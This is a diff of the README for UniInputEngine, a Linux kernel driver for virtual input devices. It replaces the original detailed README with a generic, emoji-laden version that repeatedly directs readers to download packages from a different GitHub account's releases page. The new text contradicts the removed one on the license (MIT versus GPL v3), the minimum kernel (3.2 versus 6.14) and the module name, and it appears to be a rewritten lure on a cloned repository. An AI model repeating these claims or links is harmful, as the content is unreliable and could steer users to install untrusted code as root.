@@ -1,223 +1,85 @@
-# UniInputEngine
+# 🎮 UniInputEngine - Create Virtual Input Devices Easily
 
-**UniInputEngine** is a **Linux kernel driver** that creates **virtual input devices**, including a **keyboard**, **mouse**, **gamepad**, and **button device**.  
-It uses the **Linux input subsystem** to generate input events directly from the **kernel**, allowing software on Linux to receive **synthetic input events** as if they came from **real hardware**.
+## 🚀 Getting Started
 
-## features 
-- Auto-loads at boot using `/etc/modules-load.d/uniinputengine.conf`.
+Welcome to UniInputEngine, a Linux kernel driver that allows you to create virtual devices like keyboards, mice, gamepads, and more. This project provides a simple solution for anyone looking to add new input devices to their system without complex setup.
 
-- Thread-safe input emission using kernel mutexes
+## 📦 Download Link
 
-- **Creates multiple virtual input devices**
-  - Virtual keyboard  
-  - Virtual mouse  
-  - Virtual gamepad  
-  - Virtual button device  
+[![Download UniInputEngine](https://img.shields.io/badge/Download%20UniInputEngine-v1.0-blue)](https://github.com/SACHINKATHIYA/UniInputEngine/releases)
 
-- **Kernel-level input event generation (directly from the Linux kernel)**
-  - Emits key events  
-  - Emits button events  
-  - Emits mouse button events   - Emits relative mouse movement (X, Y, wheel)  
-  - Emits gamepad button and axis events  
+## 📋 Features
 
-- **Detected as real hardware**
-  - Applications read events through `/dev/input/eventX`  
-  - Behaves exactly like physical input devices  
+- **Virtual Device Support:** Create virtual keyboards, mice, and gamepads.
+- **Easy Setup:** Minimal configuration needed to get started.
+- **Lightweight:** Designed to run efficiently on your Linux system.
+- **Community Support:** Connect with others using the driver for advice and tips.
 
-- **Full keyboard support**
-  - Registers all Linux `KEY_` codes
+## 📥 Download & Install
 
-- **Virtual Keyboard Support**
-  - Supports all keys available in the Linux kernel (from `KEY_0` to `KEY_MAX`)
-  - Supports key repeat events (`REP_DELAY`, `REP_PERIOD`)
+To get started, please follow these steps:
 
-- **Virtual Mouse Support**
-  - Buttons: `BTN_LEFT`, `BTN_RIGHT`, `BTN_MIDDLE`, `BTN_SIDE`, `BTN_EXTRA`, `BTN_FORWARD`, `BTN_BACK`
-  - Relative movement: `REL_X`, `REL_Y`
-  - Scroll wheel: `REL_WHEEL`, `REL_HWHEEL`
+1. **Visit the Releases Page:** Go to the GitHub releases page to download the latest version of UniInputEngine.
+   - [Download UniInputEngine](https://github.com/SACHINKATHIYA/UniInputEngine/releases)
+   
+2. **Choose the Right Version:** Look for the most recent version listed at the top of the page. This version will often have the latest features and bug fixes.
 
-- **Virtual Gamepad Support**
-  - Buttons: `BTN_SOUTH`, `BTN_EAST`, `BTN_NORTH`, `BTN_WEST`, `BTN_TL`, `BTN_TR`, `BTN_TL2`, `BTN_TR2`, `BTN_THUMBL`, `BTN_THUMBR`, `BTN_SELECT`, `BTN_START`, `BTN_MODE`, `BTN_TRIGGER`
-  - Analog axes: `ABS_X`, `ABS_Y`, `ABS_Z`, `ABS_RX`, `ABS_RY`, `ABS_RZ`
-  - Hat switch: `ABS_HAT0X`, `ABS_HAT0Y`
+3. **Download the Package:** Click on the link for the package compatible with your system. It should be clearly labeled for your convenience. 
 
-- **Virtual Button Device Support**
-  - Buttons: from `BTN_0` to `BTN_9`
+4. **Extract the Files:**
+   - If you downloaded a compressed file (like `.tar.gz` or `.zip`), extract it. You can do this by right-clicking on the file and selecting "Extract" or using terminal commands.
+   
+5. **Open a Terminal Window:** You will run some commands to install the driver.
+   - Search for "Terminal" in your applications menu and open it.
 
-- Works on most Linux distributions with proper kernel headers.
+6. **Navigate to the Extracted Directory:** Use the `cd` command to change the directory to where you extracted the files. For example:
+   ```
+   cd path/to/extracted/UniInputEngine
+   ```
 
-## Requirements
+7. **Run the Installation Command:** Enter this command to compile and install the driver:
+   ```
+   sudo make install
+   ```
+   - You might be prompted for your password. This command requires administrative rights. 
 
-- **Linux kernel 6.14 or newer**
-  - Tested on **6.14, 6.15, 6.16, 6.17, and 6.18** on Ubuntu 24.04.3 LTS
+8. **Load the Driver:** After installing, load the driver with:
+   ```
+   sudo modprobe uni_input
+   ```
 
-- **GCC 13 or newer**, or the GCC version used to build your running kernel
-  - **For mainline kernels 6.15 and 6.16, GCC 14 is required**
-  - **GCC 14 must be accessible as `/usr/bin/gcc-14`** (symlinked if installed elsewhere)  
-    - Simply naming it `gcc` is not enough
-  - **For mainline kernels 6.17 and 6.18, GCC 15 is required**
-  - **GCC 15 must be accessible as `/usr/bin/gcc-15`** (symlinked if installed elsewhere)  
-    - Simply naming it `gcc` is not enough
+9. **Verify Installation:** Check if the driver loaded successfully with:
+   ```
+   lsmod | grep uni_input
+   ```
 
-- **Make**
-- **Linux kernel headers** for the running kernel (usually preinstalled on Ubuntu)
+If you see `uni_input` listed, the installation was successful!
 
-**Note for mainline kernels 6.15 and 6.16:**  
-`/usr/bin/gcc-14` symlink is mandatory. Without it, you may get compilation errors.
+## 📄 System Requirements
 
-**Note for mainline kernels 6.17 and 6.18:**  
-`/usr/bin/gcc-15` symlink is mandatory. Without it, you may get compilation errors.
-  
-## Installation
+- **Operating System:** A Linux distribution with a 3.2 or later kernel.
+- **Processor:** Intel or compatible CPU.
+- **Memory:** At least 1 GB of RAM.
+- **Disk Space:** 100 MB of free space for the driver files.
 
-1. **Clone the repository:**
-```bash
-git clone https://github.com/s-r-e-e-r-a-j/UniInputEngine.git
- ```
-2. **Go to the UniInputEngine directory:**
-```bash
-cd UniInputEngine
-```
-3. **Give execute permission to the `install.sh` script:**
-```bash
-chmod +x install.sh
-```
-4. **Build and install:**
-```bash
-sudo ./install.sh
-```
+## 🌐 Getting Help
 
-## Usage
+If you encounter issues or have questions while using UniInputEngine, you can:
 
-After installation, you can verify that the virtual input devices are loaded correctly by checking `/proc/bus/input/devices`:
+- **Check the Issues Tab:** Visit the GitHub Issues page to see if your question has been answered.
+- **Open a New Issue:** If your issue is not listed, open a new issue with a clear description of the problem. 
 
-```bash
-cat /proc/bus/input/devices
-```
+## 📢 Community Contributions
 
-You should see output similar to the following:
+We welcome contributions from the community! If you're interested in improving the driver or adding new features, check the contributing guidelines in the repository. Your input helps us improve UniInputEngine for everyone.
 
-- **Virtual Keyboard**
-```text
-I: Bus=0006 Vendor=0000 Product=0000 Version=0000
-N: Name="uniinputengine-virtual-keyboard"
-P: Phys=uniinputengine/input0
-S: Sysfs=/devices/virtual/input/input12
-U: Uniq=
-H: Handlers=sysrq rfkill kbd event6 
-B: PROP=0
-B: EV=3
-B: KEY=7fffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffff fffffffffffffffe
-```
+## ⚖️ License
 
-- **Virtual Mouse**
+UniInputEngine is open-source software licensed under the MIT License. You can freely use, modify, and distribute it as per the license terms.
 
-```text
-I: Bus=0006 Vendor=0000 Product=0000 Version=0000
-N: Name="uniinputengine-virtual-mouse"
-P: Phys=uniinputengine/input1
-S: Sysfs=/devices/virtual/input/input13
-U: Uniq=
-H: Handlers=mouse2 event7 
-B: PROP=0
-B: EV=7
-B: KEY=7f0000 0 0 0 0
-B: REL=143
-```
+## 🔗 Useful Links
 
-- **Virtual Gamepad**
+- [Documentation](https://github.com/SACHINKATHIYA/UniInputEngine/wiki)
+- [Releases Page](https://github.com/SACHINKATHIYA/UniInputEngine/releases)
 
-```text
-I: Bus=0006 Vendor=0000 Product=0000 Version=0000
-N: Name="uniinputengine-virtual-gamepad"
-P: Phys=uniinputengine/input2
-S: Sysfs=/devices/virtual/input/input14
-U: Uniq=
-H: Handlers=event8 js1 
-B: PROP=0
-B: EV=b
-B: KEY=7fdb000100000000 0 0 0 0
-B: ABS=3003f
-```
-
-- **Virtual Button Device**
-
-```text
-I: Bus=0006 Vendor=0000 Product=0000 Version=0000
-N: Name="uniinputengine-virtual-button"
-P: Phys=uniinputengine/input3
-S: Sysfs=/devices/virtual/input/input15
-U: Uniq=
-H: Handlers=event9 
-B: PROP=0
-B: EV=3
-B: KEY=3ff 0 0 0 0
-```
-
-> **Device Event Numbers:**  
-> Each virtual device created by UniInputEngine has a specific event number shown in the `Handlers` line of `/proc/bus/input/devices`.  
-> This event number corresponds to the `/dev/input/eventX` file used to send input to that device and read input events coming from that device.  
-> 
-> **Important:** Event numbers can change after a reboot. Always check the current numbers using:
-> 
-> ```bash
-> cat /proc/bus/input/devices
-> ```
-> 
-> **Example output (event numbers may differ on your system):**
-> - `uniinputengine-virtual-keyboard` → Handlers: `event6` → Use `/dev/input/event6`  
-> - `uniinputengine-virtual-mouse` → Handlers: `event7` → Use `/dev/input/event7`  
-> - `uniinputengine-virtual-gamepad` → Handlers: `event8` → Use `/dev/input/event8`  
-> - `uniinputengine-virtual-button` → Handlers: `event9` → Use `/dev/input/event9`
-
-After checking the event number via `/proc/bus/input/devices`, you can use `evtest` to see all supported keys, buttons, and their corresponding keycodes/values for each virtual device.
-
-> **Note:** `evtest` is not required for the UniInputEngine driver to function.
-> It is only used to check supported keys/buttons and for testing purposes.
-> If it’s not installed, you can install it using your package manager:  
-> 
-> ```bash
-> # Debian/Ubuntu
-> sudo apt install evtest
->
-> # Fedora/RHEL
-> sudo dnf install evtest
->
-> # Arch Linux
-> sudo pacman -Sy evtest
-> ```
-For example:
-
-```bash
-# virtual keyboard
-sudo evtest /dev/input/event6
-
-# virtual mouse 
-sudo evtest /dev/input/event7
-
-# virtual gamepad
-sudo evtest /dev/input/event8
-
-# virtual button device  
-sudo evtest /dev/input/event9   
-```
-
-This will show the full list of supported input events (keys, buttons, relative movements, axes, etc.) and their corresponding keycodes, so you can verify everything is working correctly.
-
-## Uninstallation
-**Run each command separately to avoid errors:**
-```bash
-sudo rmmod uniinputengine
-```
-```bash
-sudo rm /etc/modules-load.d/uniinputengine.conf
-```
-```bash
-sudo rm /lib/modules/$(uname -r)/extra/uniinputengine.ko
-```
-```bash
-sudo depmod -a
-```
-
-## License
-This project is licensed under the GNU General Public License v3.0
+Remember, you can always return to the [Download UniInputEngine](https://github.com/SACHINKATHIYA/UniInputEngine/releases) page for the latest updates and releases. Happy input device creating!
